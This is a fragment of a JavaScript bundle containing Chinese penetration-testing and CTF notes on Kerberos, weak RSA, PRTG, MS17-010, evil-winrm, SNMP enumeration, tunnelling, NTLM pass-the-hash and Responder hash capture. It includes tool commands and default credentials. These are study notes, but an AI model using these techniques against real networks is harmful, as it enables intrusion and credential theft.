              \u80FD\u7528\u901A\u7528\u7684\u8BED\u8A00\u4ECB\u7ECD\u4E0B Kerberos \u534F\u8BAE\u4E48\uFF1F - \u8F66\u5C0F\u80D6\u7684\u56DE\u7B54 - \u77E5\u4E4E    https://www.zhihu.com/question/22177404/answer/492680179

          \u672C\u8D28\uFF1A
              \u4E00\u53E5\u8BDD\u6765\u8BF4\uFF0CKerberos \u662F\u4E00\u79CD\u57FA\u4E8E\u52A0\u5BC6 Ticket \u7684\u8EAB\u4EFD\u8BA4\u8BC1\u534F\u8BAE\u3002

              \u6765\u6E90\u4E8E\u53E4\u5E0C\u814A\u795E\u8BDD\u4E2D\u7684 Cerberus \u2014\u2014 \u5B88\u62A4\u5730\u72F1\u4E4B\u95E8\u7684\u4E09\u5934\u72AC\u3002

          \u7EC4\u6210\u90E8\u5206\uFF1A
              Kerberos \u4E3B\u8981\u7531\u4E09\u4E2A\u90E8\u5206\u7EC4\u6210\uFF1A
                  Key Distribution Center (\u5373KDC)\u3001
                  Client
                  \u548C Service\u3002

      Kerberos relay
          \u901A\u8FC7dns\u670D\u52A1\u7684kerberbos\u8BA4\u8BC1\uFF0Crelay\u5230ad cs\u3002\u679C\u7136\u8FD9\u4E2A\u70B9\u8FD8\u6709\u5F88\u591A\u5229\u7528\u573A\u666F\u53EF\u4EE5\u6316\u6398\u3002
              https://t.zsxq.com/qNzzZFa
          https://t.zsxq.com/MfIA6eY



  https://t.zsxq.com/3BEybIE



  \u5FAE\u8F6F\u5B98\u65B9\u5BF9\u4E8EAD\u7684\u5B9E\u73B0
      https://t.zsxq.com/faUnUz3



  ata
      https://t.zsxq.com/nQJU7MV


  `]))),Object(u.a)(Pn||(Pn=Object(t.a)([`
  \u3010weak\u3011\u3001\u3010\u5F31\u52A0\u5BC6\u3011\u3001\u3010\u5F31\u7B97\u6CD5\u3011
  \u3010RSA\u3011\u3001\u3010\u516C\u94A5\u3011\u3001\u3010pub\u3011\u3001\u3010.pub\u3011\u3001\u3010\u79C1\u94A5\u3011\u3001\u3010private\u3011\u3001\u3010.enc\u3011


  \u5982\u679Cp\u548Cq\u503C\u662F\u8F83\u5C0F\u7684\u7D20\u6570\uFF0C\u6211\u4EEC\u53EF\u4EE5\u6253\u7834 RSA \u7B97\u6CD5

  RSA \u6709\u4E00\u4E9B\u5F31\u70B9\u3002\u7279\u522B\u662F\uFF0C\u5F53\u4F7F\u7528\u5C0F\u5BC6\u94A5\u65F6\uFF0C\u53EF\u4EE5\u4ECE\u516C\u94A5\u4E2D\u5BFC\u51FA\u79C1\u94A5\u3002

  \u76F8\u5173\u5DE5\u5177\uFF1A
      OpenSSL
          openssl rsautl -in flag.enc -out flag.txt -decrypt -inkey key.priv

      RsaCtfTool/RsaCtfTool.py
          python    RsaCtfTool.py             --publickey ./key.pub   --private
          python3   RsaCtfTool/RsaCtfTool.py  --publickey key.pub     --uncipherfile flag.enc


  `]))),Object(u.a)(Sn||(Sn=Object(t.a)([`
  \u3010PRTG\u3011\u3001\u3010Netmon\u3011\u3001

  CMS
      PRTG\u3001Netmon
          \u5168\u79F0\u4E3A PRTG Network Monitor \uFF08NETMON\uFF09

          \u96B6\u5C5E\u4E8E\u300APaessler\u300B\u516C\u53F8

          \u5E38\u89C1\u9ED8\u8BA4\u8D26\u53F7\u5BC6\u7801\uFF1A
              prtgadmin/prtgadmin

          \u914D\u7F6E\u6587\u4EF6\u67E5\u627E\uFF1A
              \u53C2\u8003\u8D44\u6599\uFF1Ahttps://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data

              \u300APRTG Configuration\u300B

          \u547D\u4EE4\u6CE8\u5165
              \u8D44\u6599\uFF1Ahttps://www.codewatch.org/blog/?p=453

          \u8EAB\u4EFD\u9A8C\u8BC1\u7684rce\uFF1A
              \u8D44\u6599\uFF1Ahttps://github.com/wildkindcc/CVE-2018-9276
              CVE-2018-9276


  `]))),Object(u.a)(jn||(jn=Object(t.a)([`
  \u3010MS-17-010\u3011\u3001\u3010\u6C38\u6052\u4E4B\u84DD\u3011
  \u3010SMB\u3011\u3001\u3010Samba\u3011

  \u4ECB\u7ECD\uFF1A
      Windows SMB \u4E2D\u7684\u4E00\u4E2A\u672A\u7ECF\u8EAB\u4EFD\u9A8C\u8BC1\u7684\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E
      \u5728 2017 \u5E74\u88AB\u4E00\u6B3E\u540D\u4E3A\u201CWannaCry\u201D\u7684\u52D2\u7D22\u8F6F\u4EF6\u4F7F\u7528\u540E\u58F0\u540D\u9E4A\u8D77\u3002

  \u5229\u7528\u65B9\u5F0F\uFF1A
      metasploit
      Impacket

  `]))),Object(u.a)(xn||(xn=Object(t.a)([`
  \u30105985\u3011\u3001\u3010WinRM\u3011\u3001\u3010Windows Remote Manager\u3011
  \u3010evil-winrm\u3011\u3001\u3010EvilWinrm\u3011\u3001


  evil-winrm / EvilWinrm

      evil-winrm  -i  <IP\u5730\u5740>  -u  <\u7528\u6237\u540D>  -p  <\u5BC6\u7801\u503C>

      ruby  evil-winrm.rb  -i  <IP\u5730\u5740>  -u  <\u7528\u6237\u540D>  -p  <\u5BC6\u7801\u503C>

      \u5185\u7F6E\u547D\u4EE4\uFF1A
          upload  <\u653B\u51FB\u673A\u6587\u4EF6\u8DEF\u5F84>
              \u4ECE\u653B\u51FB\u673A\uFF0C\u4E0A\u4F20\u6587\u4EF6\uFF0C\u5230\u53D7\u5BB3\u673A

          net  use  <\u5177\u4F53SMB\u7684share\u8DEF\u5F84>

  `]))),Object(u.a)(wn||(wn=Object(t.a)([`
  \u3010dos2unix\u3011

  dos2unix
      dos2unix  <dos\u6587\u4EF6\u8DEF\u5F84>
          \u4EC5\u4EC5\u5728\u683C\u5F0F\u4E0A\uFF0C\u8FDB\u884C\u8F6C\u53D8
      unix2dos  <dos\u6587\u4EF6\u8DEF\u5F84>
          \u4EC5\u4EC5\u5728\u683C\u5F0F\u4E0A\uFF0C\u8FDB\u884C\u8F6C\u53D8

  `]))),Object(u.a)(Tn||(Tn=Object(t.a)([`
  \u3010web\u3011\u3001\u3010\u7F51\u7AD9\u3011\u3001\u3010site\u3011  /  \u3010wappalyzer\u3011

  \u3010Nginx\u3011\u3001\u3010Apache\u3011\u3001\u3010Node.js\u3011\u3001\u3010NodeJS\u3011\u3001\u3010Jetty\u3011
  \u3010Express\u3011\u3001\u3010_Express_\u3011\u3001

  \u3010CMS\u3011\u3001
  \u3010Magento\u3011\u3001\u3010UniFi\u3011\u3001
  \u3010Jenkins\u3011\u3001\u30108080\u3011\u3001

  \u3010FrameWork\u3011\u3001\u3010\u6846\u67B6\u3011  /  \u3010Middleware\u3011\u3001\u3010\u4E2D\u95F4\u4EF6\u3011\u3001\u3010\u7248\u672C\u3011\u3001\u3010CVE\u3011
  `,"  ","  ",`
  `,`

  `,`




  \u7F51\u9875\u62A5\u9519

      302
          \u8FD4\u56DE\u3010302\u3011+\u3010Location\u3011\uFF0C\u4F1A\u8DF3\u8F6C Location \u7684\u7F51\u9875\u5730\u5740\u3002

          \u8DF3\u8F6C\u3010Location\u3011\u540E\uFF0C\u6709\u65F6\u4F1A\u65E0\u6CD5\u663E\u793A\uFF1A
              \u539F\u7406\uFF1A
                  \u539F\u3010IP\u9875\u9762\u3011\uFF0C\u5FC5\u987B\u8981\u6C42\u3010\u4ECE\u57DF\u540D\u8BBF\u95EE\u3011\u3002
                  \u800C\u6211\u4EEC\u65E0\u6CD5\u76F4\u63A5\u8BBF\u95EE\u3010\u57DF\u540D\u9875\u9762\u3011\uFF0C\u4F46\u662F\u6211\u4EEC\u80FD\u591F\u8BBF\u95EE\u3010IP\u9875\u9762\u3011\u3002
                  \u6240\u4EE5\uFF0C\u6700\u7EC8\uFF0C\u6211\u4EEC\u4FEE\u6539\u3010hosts\u6587\u4EF6\u3011\uFF1B\u6765\u5B9E\u73B0\u3010\u865A\u62DF\u7684\u57DF\u540D\u8BBF\u95EE\u3011\u3002

      Chrome\u8BE6\u7EC6\u62A5\u9519
          DNS_PROBE_FINISHED_NXDOMAIN
              123

  \u4FEE\u6539\u300A/etc/hosts\u300B



  Apache
      /etc/apache2


  `])),X,gu.a,yu,su.a,Ie.SSTI_\u6A21\u677F\u6CE8\u5165_\u6A21\u677F\u6E32\u67D3_\u6A21\u677F\u5F15\u64CE_\u624B\u518C),Object(u.a)(In||(In=Object(t.a)([`
  \u3010XXE\u3011\u3001\u3010XEE\u3011

  `,`

  `])),Zu),Object(u.a)(Mn||(Mn=Object(t.a)([`
  \u3010exe\u3011\u3001\u3010\u53EF\u6267\u884C\u6587\u4EF6\u3011\u3001
  \u3010pwn\u3011\u3001
  \u3010\u9006\u5411\u3011\u3001\u3010\u9006\u5411\u5DE5\u7A0B\u3011\u3001\u3010REVERSE ENGINEERING\u3011\u3001
  \u3010\u53CD\u7F16\u8BD1\u3011\u3001\u3010decompile\u3011\u3001
  \u3010\u6C47\u7F16\u3011\u3001\u3010ASM\u3011\u3001\u3010assemble\u3011\u3001
  \u3010\u4E8C\u8FDB\u5236\u3011\u3001\u3010binary\u3011\u3001
  \u3010Windows\u3011\u3001\u3010Linux\u3011\u3001

  `,`

  `])),me),Object(u.a)(Ln||(Ln=Object(t.a)([`
  \u3010Tomcat\u3011

  `,`

  `])),gu.a),Object(u.a)(kn||(kn=Object(t.a)([`
  \u3010JWT\u3011\u3001\u3010jsonwebtoken\u3011\u3001

  `,`
  `])),ce),Object(u.a)(Rn||(Rn=Object(t.a)([`
  \u3010\u6D4F\u89C8\u5668\u3011\u3001\u3010Firefox\u3011\u3001

  `,`

  `])),he),Object(u.a)(Nn||(Nn=Object(t.a)([`
  \u3010CTF\u3011

  CTF\uFF0C\u6709\u8DA3\u7684\u8D44\u6599\uFF1A
      https://www.leavesongs.com/content/files/slides/CTF%E6%AF%94%E8%B5%9B%E6%80%BB%E6%98%AF%E8%BE%93%EF%BC%9F%E4%BD%A0%E8%BF%98%E5%B7%AE%E7%82%B9Tricks%21.pdf
          \u7591\u4F3C\uFF0C\u662F\u7528\u300Aslides\u6846\u67B6\u300B\u5236\u4F5C\u7684\uFF1F\uFF1F

  CTF\uFF0C\u7EC3\u4E60\u7AD9\u70B9\uFF1A
      https://pwnhub.cn/

      \u3010CTFshow\u3011\uFF0C\u2014\u2014\u840C\u65B0\u5165\u95E8\u7684\u597D\u5730\u65B9
          https://ctf.show/

  `]))),Object(u.a)(Wn||(Wn=Object(t.a)([`
  \u3010\u533A\u5757\u94FE\u3011\u3001\u3010BlockChain\u3011
  \u3010\u6570\u5B57\u8D27\u5E01\u3011

  `,`

  `])),We),Object(u.a)(Hn||(Hn=Object(t.a)([`
  \u3010APP\u3011\u3001\u3010Apk\u3011\u3001
  \u3010Android\u3011\u3001\u3010\u5B89\u5353\u3011
  \u3010iOS\u3011\u3001\u3010Apple\u3011\u3001\u3010\u82F9\u679C\u3011

  \u3010UniDbg\u3011\u3001\u3010Frida\u3011

  `,`

  `])),Te),Object(u.a)(Un||(Un=Object(t.a)([`
  \u3010\u6EAF\u6E90\u3011

  \u5927\u90E8\u5206\u5185\u5BB9\uFF0C\u548C\u300A\u4FE1\u606F\u6536\u96C6\u300B\u662F\u6709\u91CD\u53E0\u7684


  `,`

  `])),Ue),Object(u.a)(Kn||(Kn=Object(t.a)([`

  \u3010SNMP\u3011\u3001\u3010161\u3011\u3001\u3010162\u3011

  \u4ECB\u7ECD\uFF1A
      \u7F51\u7EDC\u7BA1\u7406\u534F\u5B9A

      Simple Network Management Protocol\uFF0C\u7B80\u5355\u7F51\u7EDC\u7BA1\u7406\u534F\u8BAE

  \u4F7F\u7528\u65B9\u5F0F\uFF1A
      snmpwalk -c public IP\u5730\u5740 \uFF08\u8FD0\u884C\u4E0D\u8D77\u6765\uFF0C\u6682\u65F6\u6CA1\u641E\u61C2\u600E\u4E48\u7528\u7684\uFF09

      metasploit
          \u3010use auxiliary/scanner/snmp/snmp_enum\u3011\u2014\u2014\u3010set rhosts \u76EE\u6807IP\u5730\u5740\u3011\u2014\u2014\u3010run\u3011
              \u5C1D\u8BD5\u83B7\u5F97\uFF0C\u7528\u6237\u8D26\u6237\u540D
          \u3010use auxiliary/scanner/snmp/snmp_enumusers\u3011\u2014\u2014\u3010set rhosts \u76EE\u6807IP\u5730\u5740\u3011\u2014\u2014\u3010run\u3011
              \u5C1D\u8BD5\u83B7\u5F97\uFF0C\u66F4\u591A\u7684\u7528\u6237\u8D26\u6237\u540D

  `]))),Object(u.a)(Jn||(Jn=Object(t.a)([`
  \u3010ARP\u3011

  \u4ECB\u7ECD\uFF1A
      \u5730\u5740\u89E3\u6790\u534F\u8BAE\u3002  Address Resolve Protocol\u3002

      \u5E38\u7528\u4F5C\u3010\u5185\u7F51\u8BEF\u5BFC\u3011

  \u6B65\u9AA4\uFF1A
      123


  `]))),Object(u.a)(zn||(zn=Object(t.a)([`
  \u3010Syslog\u3011\u3001\u3010514\u3011

  \u4ECB\u7ECD\uFF1A
      System Log\uFF0C\u7CFB\u7EDF\u65E5\u5FD7\u3002
      \u4E00\u79CD\u534F\u8BAE\uFF0C\u7528\u4E8E\u53D1\u9001\uFF1A
          \u7528\u4E8E\u628A\u7CFB\u7EDF\u65E5\u5FD7\u53D1\u9001\u5230\u8FDC\u7A0B\u4E3B\u673A\u4E0A\u3002

  `]))),Object(u.a)(Vn||(Vn=Object(t.a)([`
  \u3010IPC\u3011

  \u4ECB\u7ECD\uFF1A
      \u8FDB\u7A0B\u95F4\u901A\u8BAF \uFF08Inter-Process Communication\uFF09\u3002


  `]))),Object(u.a)(Gn||(Gn=Object(t.a)([`
  \u3010wmi\u3011\u3001\u3010wmic\u3011

  \u4ECB\u7ECD\uFF1A
      WMI\uFF0C\u539F\u6307\u3010Windows\u7BA1\u7406\u89C4\u8303\u3011\uFF0C\u53C8\u79F0\u4E3A\u3010Windows\u7CFB\u7EDF\u63D2\u4EF6\u3011\u3002
      Windows Management Instrumentation\uFF0CWindows\u7BA1\u7406\u5DE5\u5177\u3002

  \u76F8\u5173\u547D\u4EE4\uFF1A
      wmiexec

  `]))),Object(u.a)(Xn||(Xn=Object(t.a)([`
  \u3010mqtt\u3011

  `,`

  `])),wu),Object(u.a)(Qn||(Qn=Object(t.a)([`
  \u3010\u90AE\u4EF6\u3011\u3001\u3010mail\u3011

  \u3010SMTP\u3011\u3001\u3010POP3\u3011\u3001\u3010IMAP4\u3011

  \u90AE\u4EF6\u76F8\u5173\u7684\u534F\u8BAE\u3002
      SMTP
          \u7AEF\u53E325
      POP3
          \u7AEF\u53E3110
      IMAP
          \u7AEF\u53E3143

  `]))),Object(u.a)(Yn||(Yn=Object(t.a)([`
  \u3010\u96A7\u9053\u3011\u3001\u3010tunnel\u3011\u3001\u3010\u96A7\u9053\u8F6C\u53D1\u3011
  \u3010\u5185\u7F51\u4EE3\u7406\u3011\u3001\u3010\u5185\u7F51\u7A7F\u900F\u3011\u3001\u3010\u5185\u7F51\u6E17\u900F\u3011\u3001\u3010FRP\u3011

  \u63D0\u5230\u7684\u4E00\u4E9B\u5DE5\u5177
      Neo-reGeorg

  \u8FD9\u5757\uFF0C\u6211\u76EE\u524D\u8FD8\u4E0D\u662F\u5F88\u6E05\u695A\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026
      \u96A7\u9053\u8F6C\u53D1
          \u7ED9\u5230\u7684\u4E00\u4E9B\u5DE5\u5177
              2\u3001http\u811A\u672C
                  reGeorg
                  tunna
                  woo...
                  wevely....
              4\u3001RDP\u96A7\u9053\u8F6C\u53D1
                  SocksOverRDP
              6\u3001\u6B63\u53CD\u5411TCP\u7AEF\u53E3\u8F6C\u53D1
                  nginx
                  netsh
                      \uFF08\u9632\u706B\u5899\u4E4B\u7C7B\u7684\uFF0C\u76F8\u5173\u7684\uFF09
                  socat
                  ew
                      \u4E0D\u514D\u6740



  `]))),Object(u.a)(Zn||(Zn=Object(t.a)([`
  \u3010Redis\u3011\u3001\u30106379\u3011\u3001

  `,`

  `])),_e),Object(u.a)($n||($n=Object(t.a)([`
  \u3010NTLM\u3011\u3001
  \u3010PTH\u3011\u3001

  \u548C\u300AMimikatz\u300B\u3001\u300AKerberos\u300B\u3001\u300A\u9EC4\u91D1\u7968\u636E\u300B\u3001\u300A\u767D\u94F6\u7968\u636E\u300B\u6709\u5173

  \u7B80\u4ECB\uFF1A
      \u662F NT Lan Manager \u7684\u7F29\u5199\u3002
      NTLM \u662F\u6307telnet \u7684\u4E00\u79CD\u9A8C\u8BC1\u8EAB\u4EFD\u65B9\u5F0F\uFF0C\u5373\u95EE\u8BE2/\u5E94\u7B54\u8EAB\u4EFD\u9A8C\u8BC1\u534F\u8BAE\uFF0C
          \u662FWindows NT \u65E9\u671F\u7248\u672C\u7684\u6807\u51C6\u5B89\u5168\u534F\u8BAE\uFF0C
      Windows 2000 \u652F\u6301NTLM \u662F\u4E3A\u4E86\u4FDD\u6301\u5411\u540E\u517C\u5BB9\u3002
          Windows 2000\u5185\u7F6E\u4E09\u79CD\u57FA\u672C\u5B89\u5168\u534F\u8BAE\u4E4B\u4E00\u3002

  NTLM\u7684\u6765\u6E90\uFF1A
      \u53EF\u4EE5\u4ECE\u300AResponder\u300B\u7684\u6B3A\u9A97\u52AB\u6301\u4E2D\u5F97\u5230\u3002

  \u5728windows\u4E2D\u7684\u300A\u5E94\u7528\u573A\u666F\u300B\uFF1A
      windows\u57FA\u4E8ENTLM\u8BA4\u8BC1\u7684\u6709SMB\u3001HTTP\u3001LDAP\u3001MSSQL\u7B49\u3002
          \u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u786E\u5B9E\u4EE4\u4EBA\u9707\u60CA\uFF0C\u6709\u8FD9\u4E48\u591A\u8FD0\u7528\u7684

  NTLM\u7684\u7528\u9014\uFF1A
      \u8FD8\u539F\u51FA\u7684NTLM hash\u53EF\u7528\u4E8EPTH\u653B\u51FB


  \u300ANTLM HASH\u4E2D\u7EE7\u653B\u51FB\u300B
      \u4E00\u4E9B\u5229\u7528\u6761\u4EF6

  `]))),Object(u.a)(qn||(qn=Object(t.a)([`
  \u3010Responder\u3011


  \u8D44\u6599\uFF1A
      \u57FA\u672C\u539F\u7406\u548C\u5229\u7528\u624B\u6CD5\uFF1A
              \u5185\u7F51\u6E17\u900F\u4E4BResponder\u653B\u9632\uFF08\u4E0A\uFF09 - FreeBuf\u7F51\u7EDC\u5B89\u5168\u884C\u4E1A\u95E8\u6237    https://www.freebuf.com/articles/network/256844.html

      \u6E90\u7801\u5B9E\u73B0\u548C\u57FA\u4E8E\u6E90\u7801\u7684\u4FEE\u590D\u5F3A\u5316
              \u6D45\u6790\u5982\u4F55\u8BA9\u4F60\u7684Responder\u66F4\u5F3A\u5927\u4E4B\u4FEE\u590D\u7BC7 - \u817E\u8BAF\u4E91\u5F00\u53D1\u8005\u793E\u533A-\u817E\u8BAF\u4E91    https://cloud.tencent.com/developer/article/1582096

      \u4E00\u4E9B\u5355\u7EAF\u7684\u7B80\u5355\u5B9E\u9A8C\uFF1A
              https://sher10ck.com/2020/12/14/Responder-Pentest/

  \u7B80\u4ECB\uFF1A
      \u662F\u4E00\u6B3E\u6076\u610F\u653B\u51FB\u7684\u5DE5\u5177

      \u5728\u5185\u7F51\u653B\u9632\u4E2D\uFF0Cresponder\u5C31\u662F\u4E00\u4E2A\u4E0D\u5F97\u4E0D\u8BF4\u7684\u5DE5\u5177\uFF0C\u5C31\u8FDE\u201C\u653B\u51FB\u65B9\u5929\u82B1\u677F\u201D----\u5927\u540D\u9F0E\u9F0E\u7684APT\u7EC4\u7EC7\u4E5F\u6709\u4F7F\u7528\u8FC7\u8BE5\u6B3E\u5DE5\u5177\uFF0C
          \u6709\u8BC1\u636E\u8868\u660E\uFF0C\u4FC4\u7F57\u65AF\u7684APT\u7EC4\u7EC7--APT28\u66FE\u7ECF\u4F7F\u7528\u8FC7\u8FD9\u6B3E\u5DE5\u5177\u8FDB\u884CAPT\u653B\u51FB\u3002

      \u7531Laurent Gaffie\u64B0\u5199\u7684Responder\u662F\u8FC4\u4ECA\u4E3A\u6B62\uFF0C\u5728\u6BCF\u4E2A\u6E17\u900F\u6D4B\u8BD5\u4EBA\u5458\u7528\u4E8E\u7A83\u53D6\u4E0D\u540C\u5F62\u5F0F\u7684\u51ED\u8BC1\uFF08\u5305\u62ECNet-NTLM hash\uFF09\u7684\u6700\u53D7\u6B22\u8FCE\u7684\u5DE5\u5177\u3002
          \u5B83\u901A\u8FC7\u6C61\u67D3LLMNR\u548CNBT-NS\u7B49\u4E3B\u673A\u89E3\u6790\u8BF7\u6C42\uFF0C\u4ECE\u800C\u6B3A\u9A97\u76EE\u6807\u4E3B\u673A\u4E0E\u5176\u5B9E\u73B0\u7684\u6076\u610F\u670D\u52A1\u5668\u901A\u4FE1\uFF0C\u4ECE\u800C\u8FBE\u5230\u8BBE\u7F6E\u6076\u610F\u6D4F\u89C8\u5668\u4EE3\u7406\uFF0C\u7A83\u53D6\u51ED\u8BC1\u7B49\u76EE\u7684\u3002
          \u5F53\u7F51\u7EDC\u4E0A\u7684\u8BBE\u5907\u5C1D\u8BD5\u7528LLMNR\u548CNBT-NS\u8BF7\u6C42\u6765\u89E3\u6790\u76EE\u7684\u5730\u673A\u5668\u65F6\uFF0CResponder\u5C31\u4F1A\u4F2A\u88C5\u6210\u76EE\u7684\u5730\u673A\u5668\u3002
              \u5F53\u53D7\u5BB3\u8005\u673A\u5668\u5C1D\u8BD5\u767B\u9646\u653B\u51FB\u8005\u673A\u5668\uFF0Cresponder\u5C31\u53EF\u4EE5\u83B7\u53D6\u53D7\u5BB3\u8005\u673A\u5668\u7528\u6237\u7684Net-NTLM\u54C8\u5E0C\u503C\u3002


  \u672C\u8D28\u5206\u6790\uFF1A
      \u8D44\u6599\uFF1A
          \u5185\u7F51\u6E17\u900F\u4E4BResponder\u653B\u9632\uFF08\u4E0A\uFF09 - FreeBuf\u7F51\u7EDC\u5B89\u5168\u884C\u4E1A\u95E8\u6237    https://www.freebuf.com/articles/network/256844.html
                  \u63D0\u4F9B\u4E86\u3010\u539F\u7406\u3011\u768475%
          \u6D45\u6790\u5982\u4F55\u8BA9\u4F60\u7684Responder\u66F4\u5F3A\u5927\u4E4B\u4FEE\u590D\u7BC7 - \u817E\u8BAF\u4E91\u5F00\u53D1\u8005\u793E\u533A-\u817E\u8BAF\u4E91      https://cloud.tencent.com/developer/article/1582096
                  \u63D0\u4F9B\u4E86\u3010\u539F\u7406\u3011\u768425%    \u63D0\u4F9B\u4E86\u3010\u5B9E\u9A8C\u3011\u768450%
          Responder\u5728\u6E17\u900F\u6D4B\u8BD5\u4E2D\u7684\u5229\u7528 | Sriracha :)    https://sher10ck.com/2020/12/14/Responder-Pentest/
                  \u63D0\u4F9B\u4E86\u3010\u5B9E\u9A8C\u3011\u768425%

      \u672C\u8D28\uFF1A
            \u2460 \u5728\u4F7F\u7528Responder\u4E4B\u524D\uFF0C\u6211\u4EEC\u8981\u5148\u4E86\u89E3windwos\u9ED8\u8BA4\u5F00\u542F\u7684\u4E09\u79CD\u534F\u8BAE\uFF0C
                    \u8FD9\u4E09\u79CD\u534F\u8BAE\u5206\u522B\u662F\u94FE\u8DEF\u672C\u5730\u591A\u64AD\u540D\u79F0\u89E3\u6790\uFF08LLMNR\uFF09\u3001\u540D\u79F0\u670D\u52A1\u5668(NBNS) \u534F\u8BAE\u548C\u591A\u64ADDNS\uFF08mdns\uFF09\u534F\u8BAE\u3002

            \u2461 \u5728DNS\u89E3\u6790\u5931\u8D25\u540E\uFF0C\u4F1A\u9ED8\u8BA4\u8C03\u8D77\u300A\u8FD9\u4E09\u8005\u300B
                    \u4EE5\u4E0A\u51E0\u79CD\u534F\u8BAE\u5728windows\u4E2D\u90FD\u662F\u9ED8\u8BA4\u542F\u7528\u7684\uFF0C\u4E3B\u8981\u4F5C\u7528\u90FD\u662F\u5728DNS\u670D\u52A1\u5668\u89E3\u6790\u5931\u8D25\u540E\uFF0C\u5C1D\u8BD5\u5BF9windows\u4E3B\u673A\u540D\u79F0\u8FDB\u884C\u89E3\u6790\uFF0C
                            \u6B63\u56E0\u4E3A\u9ED8\u8BA4\u542F\u7528\u3001\u4E14\u5B9E\u73B0\u65B9\u5F0F\u53C8\u7C7B\u4F3C\u4E8EARP\u534F\u8BAE\uFF0C\u5E76\u6CA1\u6709\u4E00\u4E2A\u8BA4\u8BC1\u7684\u8FC7\u7A0B\uFF0C
                                    \u6240\u4EE5\u5C31\u4F1A\u5F15\u53D1\u5404\u79CD\u57FA\u4E8E\u8FD9\u4E24\u79CD\u534F\u8BAE\u7684\u6B3A\u9A97\u884C\u4E3A

            \u2462 \u6240\u4EE5\u6211\u4EEC\u7684\u300AResponder\u300B\u5C31\u662F\uFF0C\u5148\u8BF1\u9A97\u5176 DNS\u5931\u8D25 \u2014\u2014\u2014\u2014 \u81EA\u52A8\u8F6C\u5230\u8FD9\u4E09\u79CD\u534F\u8BAE \u2014\u2014\u2014\u2014 \u5192\u5145\u76F8\u5173\u670D\u52A1\u5668\uFF0C\u76F4\u63A5\u9A97\u53D6\u643A\u5E26\u7684\u51ED\u8BC1Token \uFF08\u7C7B\u4F3CCookie\u7684\u65B9\u5F0F\uFF09
                    \u800CResponder\u6B63\u662F\u901A\u8FC7\u8FD9\u79CD\u65B9\u5F0F\uFF0C\u6B3A\u9A97\u53D7\u5BB3\u673A\u5668\uFF0C\u5E76\u4F7F\u53D7\u5BB3\u673A\u5668\u5728\u540E\u7EED\u8BA4\u8BC1\u4E2D\u53D1\u9001\u5176\u51ED\u8BC1\u3002


            \u8865\u5145\u95EE\u9898\uFF1A
                    \u90A3\u5230\u5934\u6765\uFF0C\u4E3A\u4EC0\u4E48\u4F1A\u53D1\u9001\u300ANTLM V2 Hash\u300B\u5462\uFF1F
                            \u4ECB\u7ECD\uFF1A
                                    \u6839\u636E\u4E0A\u8FF0\u77E5\u8BC6\uFF0C\u6211\u4EEC\u77E5\u9053\u4E86responder\u5982\u4F55\u6B3A\u9A97\u53D7\u5BB3\u4E3B\u673A\uFF0C\u90A3\u4E48\u4E3A\u4EC0\u4E48\u53D7\u5BB3\u4E3B\u673A\u4F1A\u53D1\u9001NTLM v2 Hash\u5462\uFF1F
                                    \u8FD9\u5C31\u6D89\u53CA\u5230NTLM\u8BA4\u8BC1\u7684\u77E5\u8BC6\u4E86\uFF0C\u65E9\u671FSMB\u534F\u8BAE\u5728\u7F51\u7EDC\u4E0A\u4F20\u8F93\u660E\u6587\u53E3\u4EE4\uFF0C
                                            \u540E\u6765\u5FAE\u8F6F\u8FDB\u884C\u4E86\u6539\u8FDB\u63A8\u51FA\u4E86NTLMv1\u4F1A\u8BDD\u534F\u8BAE\uFF0C
                                                    \u7531\u4E8ENTLMv1\u4E5F\u5F88\u8106\u5F31\uFF0C\u6240\u4EE5\u540E\u6765\u5C31\u6709\u4E86NTLM v2\u4EE5\u53CAKerberos\u9A8C\u8BC1\u4F53\u7CFB\uFF0C
                                                            \u76EE\u524Dwinserver 2008\u53CA\u4EE5\u540E\u7684windows\u7248\u672C\u9ED8\u8BA4\u5747\u662F\u4F7F\u7528NetNTLMv2\u7684\uFF0C
                                                                    \u9ED8\u8BA4\u4F7F\u7528NTLMv1\u7684\u67092003\u3001XP\u8FD9\u4E9B\u673A\u5668\u3002

                                    windows\u57FA\u4E8ENTLM\u8BA4\u8BC1\u7684\u6709SMB\u3001HTTP\u3001LDAP\u3001MSSQL\u7B49\uFF0C
                                            responder\u53EF\u4EE5\u901A\u8FC7\u6A21\u62DF\u6B63\u5E38\u7684SMB\u534F\u8BAE\u4ECE\u800C\u83B7\u5F97\u53D7\u5BB3\u673A\u5668\u7684NTLMV2 hash\u503C\uFF0C
                                                    NTLM v2\u4E0D\u80FD\u76F4\u63A5\u5E94\u7528\u4E8EPass The Hash\u653B\u51FB\uFF0C\u53EA\u80FD\u901A\u8FC7\u66B4\u529B\u7834\u89E3\u6765\u83B7\u53D6\u660E\u6587\u5BC6\u7801\u3002

                                            \u800C\u653B\u51FB\u8005\u83B7\u53D6NTLMv1 hash\u540E\uFF0C\u53EF\u4EE5\u76F4\u63A5\u8FD8\u539F\u51FANTLM HASH\uFF0C\u8FD9\u6837\u7684\u8BDD\u5C31\u53EF\u4EE5\u5C06NTLM HASH\u76F4\u63A5\u7528\u4E8EPass The Hash\u653B\u51FB\uFF0C
                                                    \u76F8\u8F83\u4E8ENTLM v2\u8FD8\u9700\u8981\u7834\u89E3\u624D\u80FD\u5229\u7528\u66F4\u52A0\u4E0D\u5B89\u5168\u3002

                            \u4E00\u53E5\u8BDD\u89E3\u91CA\uFF1A
                                    Windows\u4E0B\u7684\u591A\u4E2A\u300A\u5E94\u7528\u573A\u666F\u300B\uFF0C\u90FD\u5F3A\u5236\u7528\u5230\u4E86\u300ANTLM\u300B\u8BA4\u8BC1\u3002
                                            \u5C31\u548C\u5F53\u521D\u7684\u300ALdap\u300B\u5F88\u50CF\u554A\u3002\u3002\u3002

  \u5E38\u7528\u9009\u9879\uFF1A
      \u300A-I\u300B\uFF0C\u6307\u5B9A\u7F51\u5361\u63A5\u53E3
      \u300A-A\u300B\uFF0C\u5206\u6790\u6A21\u5F0F
          \u53EF\u4EE5\u5728 \u65E0\u8FD4\u56DE \u7684\u60C5\u51B5\u4E0B\uFF0C\u770B\u5230 \u8BF7\u6C42 \u4FE1\u606F\u3002
      \u300A-b\u300B\uFF0C\u8FD4\u56DE\u4E00\u79CD\u300A\u57FA\u7840Http\u8BA4\u8BC1\u65B9\u5F0F\u300B
          \u9ED8\u8BA4\u662F NTLM \u3002
